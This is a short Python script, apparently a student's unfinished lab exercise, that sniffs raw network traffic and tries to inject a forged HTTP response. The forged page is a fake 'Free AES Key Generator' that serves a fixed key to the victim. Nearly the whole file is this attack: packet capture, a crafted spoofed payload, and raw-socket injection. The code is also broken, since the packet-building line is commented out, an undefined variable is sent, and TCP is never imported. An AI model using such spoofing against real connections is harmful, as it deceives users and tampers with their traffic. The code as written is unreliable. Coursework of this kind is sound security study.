#!/usr/bin/python3

from scapy import * 
from scapy.layers.inet import IP
def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    from scapy.all import send, conf, L3RawSocket
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    payload_head = "HTTP/1.1 200 OK\r\nServer: nginx/1.4.6 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: keep-alive\r\n\r\n\r\n" # the extra \r \n are for empty fields
    payload_body = """<html> <head><title> Free AES Key Generator!</title> </head> <body> <h1 style= "margin-bottom: 0px"> Free AES Key Generator!</h1> <span style="font-size: 5%"> Definitely not run by the NSA.</span> <br> <br> <br> Your <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b> <br> </body> </html>\r\n"""
    payload= payload_head + payload_body
    #packet= IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP()/payload
    #keep getting an "packet metaclass error " that does not show up when searched, but forming the malicoud packet should go somehting like above.
    inject_pkt(packet)
def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)
        #print(str(pkt))


if __name__ == '__main__':
    main()